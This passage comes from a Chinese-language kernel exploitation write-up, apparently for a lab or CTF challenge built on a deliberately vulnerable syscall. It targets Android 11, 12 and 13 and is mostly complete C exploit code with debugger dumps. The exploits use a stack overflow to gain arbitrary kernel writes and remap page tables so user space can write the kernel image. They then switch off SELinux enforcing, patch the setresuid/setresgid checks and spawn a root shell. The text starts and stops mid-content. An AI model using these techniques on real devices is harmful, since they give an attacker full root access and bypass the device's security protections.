【在用户态将虚拟地址 0xffffff80017e6840 处改成目标d_block，重新映射全部物理地址，权限为用户态可读写】\n#\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t0x0070000040000e71\n# 【在用户态通过读写内核，改setresuid,setresgid,selinux_state，最终获得root权限】\n```\n\n所以需要利用 `FFFFFFC010209F7C STR X0, [X19]` 构造4次任意地址写，将 `0xffffff806fbf7f30` 的值覆盖成 `0x417e6753` 。\n\n\n\n本地root shell：\n\n![image-20230906142451852](image-20230906142451852.png?size=600)\n\n\n\nexp：\n\n```c\n#define _GNU_SOURCE\n#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <netinet/ip.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/uio.h>\n#include <sys/resource.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <linux/net.h>\n#include <errno.h>\n#include <signal.h>\n\n#define SYS_STACKOF 601\n#define KERNEL_RET 0xFFFFFFC0000BECC8 \n\nunsigned long arg1, arg2;\n\n#ifndef HEXDUMP_COLS\n#define HEXDUMP_COLS 16\n#endif\n\nvoid hexdump(void *mem, unsigned int len) {\n    putchar('\\n');\n    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n        /* print offset */\n        if(i % HEXDUMP_COLS == 0) {\n            printf(\"0x%06x: \", i);\n        }\n\n        /* print hex data */\n        if(i < len) {\n            printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n        }\n        /* end of block, just aligning for ASCII dump */\n        else {        \n            printf(\"   \");\n        }\n\n        /* print ASCII dump */\n        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                 /* end of block, not really printing */\n                if(j >= len) {\n                    putchar(' ');\n                }\n                /* printable char */\n                else if(isprint(((char*)mem)[j])) {\n                    putchar(0xFF & ((char*)mem)[j]);\n                }\n                 /* other char */\n                else {\n                    putchar('.');\n                }\n            }\n            putchar('\\n');\n        }\n    }\n    putchar('\\n');\n}\n\nk_stackof_read(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    // printf(\"k_stackof_read - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 1);\n}\n\nk_stackof_write(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    // printf(\"k_stackof_write - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 0);\n}\n\n\n#define IMAGE_PHYS_ADDR 0x40080000\n#define RE_MAP_ADDR 0xFFFFFFC200000000\n#define IMAGE_BASE 0xFFFFFFC010080000\n\nunsigned long SYMBOL__swapper_pg_dir = 0xFFFFFFC0117E6000;              // in android11 there is a swapper_pg_dir symbol\n\nunsigned long remap_addr_pte = 0xffffff806fbf7f30;              // linear addr space\nunsigned long remap_addr_dblock_addr = 0xffffff80017e6840;      // linear addr space\n\n\nunsigned long d_block_addr;\nunsigned long d_block;\n\nvoid init_mirror(unsigned long kernel_phys, unsigned long mirror_base) {\n    int index1 = (mirror_base & 0x0000007fc0000000) >> 30; // bits[39:31]\n    d_block_addr = SYMBOL__swapper_pg_dir + index1 * 8;  // target Table Descriptor Address\n    printf(\"descriptor: 0x%lx + %d x 8 = 0x%lx\\n\", SYMBOL__swapper_pg_dir, index1, d_block_addr);\n\n    d_block = 0;\n    d_block |= 0x1 ; // Block entry\n    /* Lower attributes */\n    d_block |= (1u << 11); // bits[11], nG\n    d_block |= (1u << 10); // bits[10], AF\n    d_block |= (1u << 9); // bits[9], SH[1]\n    d_block |= 0x40; // bits[7:6], AP[2:1] = 01\n    d_block |= 0x20; // bits[5], NS\n    d_block |= 0x10; // bits[2:0], AttrIndx[2:0]\n    d_block |= (kernel_phys & 0x0000ffffc0000000); // bits[47:30], output address\n    /* Upper attributes */\n    d_block |= (1ul << 52); // bits[52], Contiguous\n    d_block |= (1ul << 53); // bits[53], PXN\n    d_block |= (1ul << 54); // bits[54], XN\n    printf(\"d_block = 0x%lx\\n\", d_block);\n}\n\nint main(){\n    printf(\"1\\n\");\n    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);\n\n    char* buf = mmap(0x60000000, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);\n    if( buf == (void*)-1) err(\"mmap() thread\");\t\n    memset(buf, 0x0, 0x1000);\n\n    char* read_buf = buf + (0x1000-0x9b0);\n    k_stackof_read(read_buf, 0x9b0);\n\n    *((unsigned long*)&read_buf[0x970]) = remap_addr_pte; \n    hexdump(read_buf, 0x9b0);\n\n    int write_size = 0x9b0+0x23;\n    k_stackof_write(read_buf,write_size);\n\n    *((unsigned long*)&read_buf[0x970]) = remap_addr_pte+1; \n    write_size = 0x9b0+0x37;\n    k_stackof_write(read_buf,write_size);\n\n    *((unsigned long*)&read_buf[0x970]) = remap_addr_pte+2; \n    write_size = 0x9b0+0x7e - 0x30;\n    k_stackof_write(read_buf,write_size);\n\n    *((unsigned long*)&read_buf[0x970]) = remap_addr_pte+3; \n    write_size = 0x9b0+0x11;\n    k_stackof_write(read_buf,write_size);\n\n\n    // \n    *(unsigned long*)remap_addr_dblock_addr = d_block;                // make 0xfffffffc20000000 <--> phys_0\n\n\n// write kernel image\n    /* selinux_state*/\n    unsigned long selinux_enforcing_addr = 0xFFFFFFC011AA69D8+1;\n    unsigned long selinux_enforcing_addr_new = RE_MAP_ADDR + 0x80000 + (selinux_enforcing_addr - IMAGE_BASE);\n    printf(\"selinux_enforcing_addr_new: 0x%lx\\n\", selinux_enforcing_addr_new);\n    *(char*)selinux_enforcing_addr_new = 0x0;\n\n    /* sys_setresuid*/\n    unsigned long setresuid_if_addr = 0xFFFFFFC01023D680;\n    unsigned long setresuid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresuid_if_addr - IMAGE_BASE);\n    *(char *)(setresuid_if_addr_new+3) = 0x36;\n    printf(\"setresuid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresuid_if_addr_new);\n\n    /* sys_setresgid*/\n    unsigned long setresgid_if_addr = 0xFFFFFFC01023D888;\n    unsigned long setresgid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresgid_if_addr - IMAGE_BASE);\n    *(char *)(setresgid_if_addr_new+3) = 0x36;\n    printf(\"setresgid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresgid_if_addr_new);\n\n\n    setresuid(0,0,0);\n    setresgid(0,0,0);\n\n    system(\"/system/bin/sh\");\n\n    printf(\"exit\\n\");\n\n    return 0;\n}\n```\n\n\n\n## android 12\n\n> 内核版本： linux 5.10.160\n\n```bash\n# cat /proc/iomem\n[...]\n40000000-bfffffff : System RAM\n  40200000-4266ffff : Kernel code\n  42670000-4296ffff : reserved\n  42970000-42c6ffff : Kernel data\n  47fff000-48416fff : reserved\n  48600000-4860ffff : reserved\n  ad400000-bf9fffff : reserved\n  bfa16000-bfa95fff : reserved\n  bfa96000-bfb96fff : reserved\n  bfb97000-bfbd8fff : reserved\n  bfbdb000-bfbdbfff : reserved\n  bfbdc000-bfbddfff : reserved\n  bfbde000-bfbdefff : reserved\n  bfbdf000-bfbdffff : reserved\n  bfbe0000-bfc00fff : reserved\n  bfc01000-bfc0afff : reserved\n  bfc0b000-bfffffff : reserved\n[...]\n```\n\n\n\n利用方法同android 11，所以要将 0xffffffc200000000 对应的一级页表项设置成 d_block，让用户态可以任意读写内核image。\n\n1. 该一级页表项对应两处虚拟地址\n\n   一处是在 swapper_pg_dir 中的偏移\n\n   ```bash\n   gef➤  x/2gx 0xFFFFFFC00A466000+0x840\n   0xffffffc00a466840 <swapper_pg_dir+2112>:       0x00680081c0000701      0x0068008200000701\n   ```\n\n   一处是在线性映射区中的偏移\n\n   ```bash\n   # 偏移\n   >>> hex(0xffffffc00a466840-0xFFFFFFC008000000 + 0x200000)\n   '0x2666840'\n   \n   # 线性映射区在0xFFFFFF8000000000\n   # 对应页表项也映射到了虚拟地址 0xffffff8002666840 处\n   gef➤  x/2gx 0xFFFFFF8000000000+0x2666840\n   0xffffff8002666840:     0x00680081c0000701      0x0068008200000701\n   \n   40000000-bfffffff : System RAM\n     40200000-4266ffff : Kernel code\n     42670000-4296ffff : reserved\n     42970000-42c6ffff : Kernel data\n   ```\n\n   通过线性映射区可以接着调试查看二级页表，三级页表。由于 0xffffff8002666840 处是只读的，我们考虑将 0xffffff8002666000 对应的页表项设置成用户态和内核态可读写的状态，这样就可以在用户态写一级页表了。\n\n2. 0xffffff8002666000 地址对应的物理页表项\n\n   ```bash\n   0xffffff8002666000 \n   11111111 11111111 11111111 10000000 00000010 01100110 01100000 00000000\n   0级页表未使用\n   1级页表偏移：0000000 00 - 0*8\n   2级页表偏移：000010 011 - 19*8=0x98\n   3级页表偏移：00110 0110 - 102*8=0x330\n   \n   gef➤  x/20gx 0xFFFFFF8000000000+0x2666840\n   0xffffff8002666840:     0x00680081c0000701      0x0068008200000701\n   0xffffff8002666850:     0x0068008240000701      0x0068008280000701\n   0xffffff8002666860:     0x00680082c0000701      0x0068008300000701\n   0xffffff8002666870:     0x0068008340000701      0x0068008380000701\n   0xffffff8002666880:     0x00680083c0000701      0x0000000000000000\n   0xffffff8002666890:     0x0000000000000000      0x0000000000000000\n   0xffffff80026668a0:     0x0000000000000000      0x0000000000000000\n   0xffffff80026668b0:     0x0000000000000000      0x0000000000000000\n   0xffffff80026668c0:     0x0000000000000000      0x0000000000000000\n   0xffffff80026668d0:     0x0000000000000000      0x0000000000000000\n   gef➤  x/20gx 0xFFFFFF8000000000+0x2666000\n   0xffffff8002666000:     0x00000000bfffa003      0x00000000bfe0b003\n   0xffffff8002666010:     0x0000000000000000      0x0000000000000000\n   0xffffff8002666020:     0x0000000000000000      0x0000000000000000\n   0xffffff8002666030:     0x0000000000000000      0x0000000000000000\n   0xffffff8002666040:     0x0000000000000000      0x0000000000000000\n   0xffffff8002666050:     0x0000000000000000      0x0000000000000000\n   0xffffff8002666060:     0x0000000000000000      0x0000000000000000\n   0xffffff8002666070:     0x0000000000000000      0x0000000000000000\n   0xffffff8002666080:     0x0000000000000000      0x0000000000000000\n   0xffffff8002666090:     0x0000000000000000      0x0000000000000000\n   gef➤   x/20gx 0xFFFFFF8000000000+(0xbfffa000-0x40000000)+0x98\n   0xffffff807fffa098:     0x00000000bfff8003      0x00000000bfff7003\n   0xffffff807fffa0a8:     0x00000000bfff6003      0x00000000bfff5003\n   0xffffff807fffa0b8:     0x00000000bfff4003      0x00000000bfff3003\n   0xffffff807fffa0c8:     0x00000000bfff2003      0x00000000bfff1003\n   0xffffff807fffa0d8:     0x00000000bfff0003      0x00000000bffef003\n   0xffffff807fffa0e8:     0x00000000bffee003      0x00000000bffed003\n   0xffffff807fffa0f8:     0x00000000bffec003      0x00000000bffeb003\n   0xffffff807fffa108:     0x00000000bffea003      0x00000000bffe9003\n   0xffffff807fffa118:     0x00000000bffe8003      0x00000000bffe7003\n   0xffffff807fffa128:     0x00000000bffe6003      0x00000000bffe5003\n   gef➤   x/20gx 0xFFFFFF8000000000+(0xbfff8000-0x40000000)+0x330\n   0xffffff807fff8330:     0x0060000042666783      0x0060000042667783\n   0xffffff807fff8340:     0x0060000042668783      0x0060000042669783\n   0xffffff807fff8350:     0x006000004266a783      0x006000004266b783\n   0xffffff807fff8360:     0x006000004266c783      0x006000004266d783\n   0xffffff807fff8370:     0x006000004266e783      0x006000004266f783\n   0xffffff807fff8380:     0x0068000042670707      0x0068000042671707\n   0xffffff807fff8390:     0x0068000042672707      0x0068000042673707\n   0xffffff807fff83a0:     0x0068000042674707      0x0068000042675707\n   0xffffff807fff83b0:     0x0068000042676707      0x0068000042677707\n   0xffffff807fff83c0:     0x0068000042678707      0x0068000042679707\n   \n   # 0xffffff807fff8330 处就是 0xffffff8002666000 虚拟地址对应的页表项\n   # 0x783：0111 1000 0011 - bit[7:6]表示仅内核态可读\n   # 0x743：0111 0100 0011 - bit[7:6]表示用户态和内核态可读写\n   ```\n\n3. 写物理页表项\n\n   将虚拟地址 0xffffff807fff8330 处写成 0x0060000042666743 ，使 0xffffff8002666000 这个页面用户态可读写，那么就能将我们精心构造的d_block写入 0xffffff8002666840 中，从而达到任意读写内核image的目的了。\n\n\n\n本地 root shell\n\n![image-20230906144747651](image-20230906144747651.png?size=600)\n\n\n\nexp如下：\n\n```c\n// test2.c\n#define _GNU_SOURCE\n#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <netinet/ip.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/uio.h>\n#include <sys/resource.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <linux/net.h>\n#include <errno.h>\n#include <signal.h>\n\n#define SYS_STACKOF 601\n#define KERNEL_RET 0xFFFFFFC0000BECC8 \n\nunsigned long arg1, arg2;\n\n#ifndef HEXDUMP_COLS\n#define HEXDUMP_COLS 16\n#endif\n\nvoid hexdump(void *mem, unsigned int len) {\n    putchar('\\n');\n    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n        /* print offset */\n        if(i % HEXDUMP_COLS == 0) {\n            printf(\"0x%06x: \", i);\n        }\n\n        /* print hex data */\n        if(i < len) {\n            printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n        }\n        /* end of block, just aligning for ASCII dump */\n        else {        \n            printf(\"   \");\n        }\n\n        /* print ASCII dump */\n        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                 /* end of block, not really printing */\n                if(j >= len) {\n                    putchar(' ');\n                }\n                /* printable char */\n                else if(isprint(((char*)mem)[j])) {\n                    putchar(0xFF & ((char*)mem)[j]);\n                }\n                 /* other char */\n                else {\n                    putchar('.');\n                }\n            }\n            putchar('\\n');\n        }\n    }\n    putchar('\\n');\n}\n\nk_stackof_read(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    // printf(\"k_stackof_read - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 1);\n}\n\nk_stackof_write(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    // printf(\"k_stackof_write - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 0);\n}\n\n\n#define IMAGE_PHYS_ADDR 0x40200000\n// #define RE_MAP_ADDR 0xFFFFFFC500000000\n#define RE_MAP_ADDR 0xFFFFFFC200000000\n#define IMAGE_BASE 0xFFFFFFC008000000\n\nunsigned long SYMBOL__swapper_pg_dir = 0xFFFFFFC00A466000;              // in android11 there is a swapper_pg_dir symbol\n\nunsigned long remap_addr_pte = 0xffffff807fff8330;              // linear addr space\nunsigned long remap_addr_dblock_addr = 0xffffff8002666840;\n\n\nunsigned long d_block_addr;\nunsigned long d_block;\n\nvoid init_mirror(unsigned long kernel_phys, unsigned long mirror_base) {\n    int index1 = (mirror_base & 0x0000007fc0000000) >> 30; // bits[39:31]\n    d_block_addr = SYMBOL__swapper_pg_dir + index1 * 8;  // target Table Descriptor Address\n    printf(\"descriptor: 0x%lx + %d x 8 = 0x%lx\\n\", SYMBOL__swapper_pg_dir, index1, d_block_addr);\n\n    d_block = 0;\n    d_block |= 0x1 ; // Block entry\n    /* Lower attributes */\n    d_block |= (1u << 11); // bits[11], nG\n    d_block |= (1u << 10); // bits[10], AF\n    d_block |= (1u << 9); // bits[9], SH[1]\n    d_block |= 0x40; // bits[7:6], AP[2:1] = 01\n    d_block |= 0x20; // bits[5], NS\n    d_block |= 0x10; // bits[2:0], AttrIndx[2:0]\n    d_block |= (kernel_phys & 0x0000ffffc0000000); // bits[47:30], output address\n    /* Upper attributes */\n    d_block |= (1ul << 52); // bits[52], Contiguous\n    d_block |= (1ul << 53); // bits[53], PXN\n    d_block |= (1ul << 54); // bits[54], XN\n\n    printf(\"d_block = 0x%lx\\n\", d_block);\n}\n\nint main(){\n    printf(\"1\\n\");\n    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);\n\n    char* buf = mmap(0x60000000, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);\n    if( buf == (void*)-1) err(\"mmap() thread\");\t\n    memset(buf, 0x0, 0x1000);\n\n    char* read_buf = buf + (0x1000-0x9b0);\n    k_stackof_read(read_buf, 0x9b0);\n\n    *((unsigned long*)&read_buf[0x970]) = remap_addr_pte;           // remap_addr_pte; \n    hexdump(read_buf, 0x9b0);\n\n    /*0x42666743*/\n    int write_size = 0x9b0+0x13;\n    k_stackof_write(read_buf,write_size);\n\n    *((unsigned long*)&read_buf[0x970]) = remap_addr_pte+1; \n    write_size = 0x9b0+0x37;\n    k_stackof_write(read_buf,write_size);\n\n    *((unsigned long*)&read_buf[0x970]) = remap_addr_pte+2; \n    write_size = 0x9b0+0x36;\n    k_stackof_write(read_buf,write_size);\n\n    *((unsigned long*)&read_buf[0x970]) = remap_addr_pte+3; \n    write_size = 0x9b0+0x12;\n    k_stackof_write(read_buf,write_size);\n\n    // \n    *(unsigned long*)remap_addr_dblock_addr = d_block;                // make 0xfffffffc20000000 <--> phys_0\n\n\n// write kernel image\n    /* selinux_enforcing*/\n    unsigned long selinux_enforcing_addr = 0xFFFFFFC00AA2FB88;              // android11上是selinux_state+1的位置，而android12上又无需加1\n    unsigned long selinux_enforcing_addr_new = RE_MAP_ADDR + 0x200000 + (selinux_enforcing_addr - IMAGE_BASE);\n    printf(\"selinux_enforcing_addr_new: 0x%lx\\n\", selinux_enforcing_addr_new);\n    *(char*)selinux_enforcing_addr_new = 0x0;\n    // printf(\"selinux_enforcing_addr_new content: 0x%lx\\n\", *(char*)selinux_enforcing_addr_new);\n    /* sys_setresuid*/\n    unsigned long setresuid_if_addr = 0xFFFFFFC00815E214;\n    unsigned long setresuid_if_addr_new = RE_MAP_ADDR + 0x200000 + (setresuid_if_addr - IMAGE_BASE);\n    printf(\"setresuid_if_addr_new: 0x%lx\\n\",setresuid_if_addr_new);\n    *(char *)(setresuid_if_addr_new+3) = 0xB5;\n    // printf(\"setresuid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresuid_if_addr_new);             // 为什么加这个打印会报bus error的错？？\n\n    /* sys_setresgid*/\n    unsigned long setresgid_if_addr = 0xFFFFFFC00815E4E8;\n    unsigned long setresgid_if_addr_new = RE_MAP_ADDR + 0x200000 + (setresgid_if_addr - IMAGE_BASE);\n    printf(\"setresgid_if_addr_new: 0x%lx\\n\",setresgid_if_addr_new);\n    *(char *)(setresgid_if_addr_new+3) = 0xB5;\n    // printf(\"setresgid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresgid_if_addr_new);\n\n    printf(\"setresuid\\n\");\n    setresuid(0,0,0);\n    printf(\"setresgid\\n\");\n    setresgid(0,0,0);\n    printf(\"/system/bin/sh\\n\");\n    system(\"/system/bin/sh\");\n\n    printf(\"exit\\n\");\n\n    return 0;\n}\n```\n\n\n\n## android 13\n\n> 内核版本：linux 5.15.78\n\n```bash\n# cat /proc/iomem\n[...]\n40000000-bfffffff : System RAM\n  40210000-4299ffff : Kernel code\n  429a0000-42bfffff : reserved\n  42c00000-42eeffff : Kernel data\n  47fff000-48444fff : reserved\n  48600000-4860ffff : reserved\n  ad400000-bf9fffff : reserved\n  bfa1d000-bfa9cfff : reserved\n  bfa9d000-bfb9dfff : reserved\n  bfb9e000-bfbd7fff : reserved\n  bfbda000-bfbdcfff : reserved\n  bfbdd000-bfbddfff : reserved\n  bfbde000-bfbfefff : reserved\n  bfbff000-bfc09fff : reserved\n  bfc0a000-bfffffff : reserved\n[...]\n```\n\n利用方法同android 11/12，将 0xffffffc200000000 对应的一级页表项设置成 d_block，让用户态可以任意读写内核image。\n\n1. 该一级页表项对应两处地址\n\n   一处是在 swapper_pg_dir 中的偏移\n\n   ```bash\n   gef➤  x/2gx 0xFFFFFFC00A79F000+0x840\n   0xffffffc00a79f840 <swapper_pg_dir+2112>:       0x00680081c0000701      0x0068008200000701\n   ```\n\n   一处是在线性映射区中的偏移\n\n   ```bash\n   # 偏移\n   >>> hex(0xffffffc00a79f840 - 0xFFFFFFC008010000+ 0x210000)\n   '0x299f840'\n   \n   # 线性映射区在0xFFFFFF8000000000\n   # 对应页表项也映射到了虚拟地址 0xffffff800299f840 处\n   gef➤  x/2gx 0xFFFFFF8000000000+0x299f840\n   0xffffff800299f840:     0x00680081c0000701      0x0068008200000701\n   \n   40000000-bfffffff : System RAM\n     40210000-4299ffff : Kernel code     # 从image的_stext开始映射，对应虚拟地址0xFFFFFFC008010000\n     429a0000-42bfffff : reserved\n     42c00000-42eeffff : Kernel data\n   ```\n\n   通过线性映射区可以接着调试查看二级页表，三级页表。由于 0xffffff800299f840处是只读的，我们考虑将 0xffffff800299f000对应的页表项设置成用户态和内核态可读写的状态，这样就可以在用户态写一级页表了。\n\n2. 0xffffff800299f000地址对应的物理页表项\n\n   ```bash\n   0xffffff800299f000\n   11111111 11111111 11111111 10000000 00000010 10011001 11110000 00000000\n   0级页表未使用\n   1级页表偏移：0000000 00 - 0*8\n   2级页表偏移：000010 100 - 20*8=0xa0\n   3级页表偏移：11001 1111 - 415*8=0xcf8\n   \n   gef➤  x/20gx 0xFFFFFF8000000000+0x299f840\n   0xffffff800299f840:     0x00680081c0000701      0x0068008200000701\n   0xffffff800299f850:     0x0068008240000701      0x0068008280000701\n   0xffffff800299f860:     0x00680082c0000701      0x0068008300000701\n   0xffffff800299f870:     0x0068008340000701      0x0068008380000701\n   0xffffff800299f880:     0x00680083c0000701      0x0000000000000000\n   0xffffff800299f890:     0x0000000000000000      0x0000000000000000\n   0xffffff800299f8a0:     0x0000000000000000      0x0000000000000000\n   0xffffff800299f8b0:     0x0000000000000000      0x0000000000000000\n   0xffffff800299f8c0:     0x0000000000000000      0x0000000000000000\n   0xffffff800299f8d0:     0x0000000000000000      0x0000000000000000\n   gef➤  x/20gx 0xFFFFFF8000000000+0x299f000\n   0xffffff800299f000:     0x18000000bfff9003      0x18000000bfe0a003\n   0xffffff800299f010:     0x0000000000000000      0x0000000000000000\n   0xffffff800299f020:     0x0000000000000000      0x0000000000000000\n   0xffffff800299f030:     0x0000000000000000      0x0000000000000000\n   0xffffff800299f040:     0x0000000000000000      0x0000000000000000\n   0xffffff800299f050:     0x0000000000000000      0x0000000000000000\n   0xffffff800299f060:     0x0000000000000000      0x0000000000000000\n   0xffffff800299f070:     0x0000000000000000      0x0000000000000000\n   0xffffff800299f080:     0x0000000000000000      0x0000000000000000\n   0xffffff800299f090:     0x0000000000000000      0x0000000000000000\n   gef➤  x/20gx 0xFFFFFF8000000000+(0xbfff9000-0x40000000)+0xa0\n   0xffffff807fff90a0:     0x18000000bfff6003      0x18000000bfff5003\n   0xffffff807fff90b0:     0x18000000bfff4003      0x18000000bfff3003\n   0xffffff807fff90c0:     0x18000000bfff2003      0x18000000bfff1003\n   0xffffff807fff90d0:     0x18000000bfff0003      0x18000000bffef003\n   0xffffff807fff90e0:     0x18000000bffee003      0x18000000bffed003\n   0xffffff807fff90f0:     0x18000000bffec003      0x18000000bffeb003\n   0xffffff807fff9100:     0x18000000bffea003      0x18000000bffe9003\n   0xffffff807fff9110:     0x18000000bffe8003      0x18000000bffe7003\n   0xffffff807fff9120:     0x18000000bffe6003      0x18000000bffe5003\n   0xffffff807fff9130:     0x18000000bffe4003      0x18000000bffe3003\n   gef➤  x/20gx 0xFFFFFF8000000000+(0xbfff6000-0x40000000)+0xcf8\n   0xffffff807fff6cf8:     0x006000004299f783      0x00680000429a0707\n   0xffffff807fff6d08:     0x00680000429a1707      0x00680000429a2707\n   0xffffff807fff6d18:     0x00680000429a3707      0x00680000429a4707\n   0xffffff807fff6d28:     0x00680000429a5707      0x00680000429a6707\n   0xffffff807fff6d38:     0x00680000429a7707      0x00680000429a8707\n   0xffffff807fff6d48:     0x00680000429a9707      0x00680000429aa707\n   0xffffff807fff6d58:     0x00680000429ab707      0x00680000429ac707\n   0xffffff807fff6d68:     0x00680000429ad707      0x00680000429ae707\n   0xffffff807fff6d78:     0x00680000429af707      0x00680000429b0707\n   0xffffff807fff6d88:     0x00680000429b1707      0x00680000429b2707\n   \n   # 0xffffff807fff6cf8 处就是 0xffffff800299f000 虚拟地址对应的页表项\n   # 0x783：0111 1000 0011 - bit[7:6]表示仅内核态可读\n   # 0x743：0111 0100 0011 - bit[7:6]表示用户态和内核态可读写\n   \n   gef➤  monitor xp /20gx 0x4299f000\n   000000004299f000: 0x18000000bfff9003 0x18000000bfe0a003\n   000000004299f010: 0x0000000000000000 0x0000000000000000\n   000000004299f020: 0x0000000000000000 0x0000000000000000\n   000000004299f030: 0x0000000000000000 0x0000000000000000\n   000000004299f040: 0x0000000000000000 0x0000000000000000\n   000000004299f050: 0x0000000000000000 0x0000000000000000\n   000000004299f060: 0x0000000000000000 0x0000000000000000\n   000000004299f070: 0x0000000000000000 0x0000000000000000\n   000000004299f080: 0x0000000000000000 0x0000000000000000\n   000000004299f090: 0x0000000000000000 0x0000000000000000\n   ```\n\n3. 写物理页表项\n\n   将虚拟地址 0xffffff807fff6cf8 处写成 0x006000004299f743 ，使 0xffffff800299f000 这个页面用户态可读写，那么就能将我们精心构造的d_block写入 0xffffff800299f840 中，从而达到任意读写内核image的目的了。\n\n\n\n本地root shell\n\n![image-20230906145136302](image-20230906145136302.png?size=600)\n\n\n\nexp 如下：\n\n```c\n#define _GNU_SOURCE\n#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <netinet/ip.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/uio.h>\n#include <sys/resource.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <linux/net.h>\n#include <errno.h>\n#include <signal.h>\n\n#define SYS_STACKOF 601\n\nunsigned long arg1, arg2;\n\n#ifndef HEXDUMP_COLS\n#define HEXDUMP_COLS 16\n#endif\n\nvoid hexdump(void *mem, unsigned int len) {\n    putchar('\\n');\n    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n        /* print offset */\n        if(i % HEXDUMP_COLS == 0) {\n            printf(\"0x%06x: \", i);\n        }\n\n        /* print hex data */\n        if(i < len) {\n            printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n        }\n        /* end of block, just aligning for ASCII dump */\n        else {        \n            printf(\"   \");\n        }\n\n        /* print ASCII dump */\n        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                 /* end of block, not really printing */\n                if(j >= len) {\n                    putchar(' ');\n                }\n                /* printable char */\n                else if(isprint(((char*)mem)[j])) {\n                    putchar(0xFF & ((char*)mem)[j]);\n                }\n                 /* other char */\n                else {\n                    putchar('.');\n                }\n            }\n            putchar('\\n');\n        }\n    }\n    putchar('\\n');\n}\n\nk_stackof_read(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    // printf(\"k_stackof_read - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 1);\n}\n\nk_stackof_write(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    // printf(\"k_stackof_write - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 0);\n}\n\n\n#define IMAGE_PHYS_ADDR 0x40210000\n// #define RE_MAP_ADDR 0xFFFFFFC500000000\n#define RE_MAP_ADDR 0xFFFFFFC200000000\n#define IMAGE_BASE 0xFFFFFFC008000000\n\nunsigned long SYMBOL__swapper_pg_dir = 0xFFFFFFC00A79F000;              // in android11 there is a swapper_pg_dir symbol\n\nunsigned long remap_addr_pte = 0xffffff807fff6cf8;              // linear addr space\nunsigned long remap_addr_dblock_addr = 0xffffff800299f840;\n\n\nunsigned long d_block_addr;\nunsigned long d_block;\n\nvoid init_mirror(unsigned long kernel_phys, unsigned long mirror_base) {\n    int index1 = (mirror_base & 0x0000007fc0000000) >> 30; // bits[39:31]\n    d_block_addr = SYMBOL__swapper_pg_dir + index1 * 8;  // target Table Descriptor Address\n    printf(\"descriptor: 0x%lx + %d x 8 = 0x%lx\\n\", SYMBOL__swapper_pg_dir, index1, d_block_addr);\n\n    d_block = 0;\n    d_block |= 0x1 ; // Block entry\n    /* Lower attributes */\n    d_block |= (1u << 11); // bits[11], nG\n    d_block |= (1u << 10); // bits[10], AF\n    d_block |= (1u << 9); // bits[9], SH[1]\n    d_block |= 0x40; // bits[7:6], AP[2:1] = 01\n    d_block |= 0x20; // bits[5], NS\n    d_block |= 0x10; // bits[2:0], AttrIndx[2:0]\n    d_block |= (kernel_phys & 0x0000ffffc0000000); // bits[47:30], output address\n    /* Upper attributes */\n    d_block |= (1ul << 52); // bits[52], Contiguous\n    d_block |= (1ul << 53); // bits[53], PXN\n    d_block |= (1ul << 54); // bits[54], XN\n    printf(\"d_block = 0x%lx\\n\", d_block);\n}\n\nint main(){\n    printf(\"1\\n\");\n    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);\n\n    char* buf = mmap(0x60000000, 0x1000, PROT_READ | 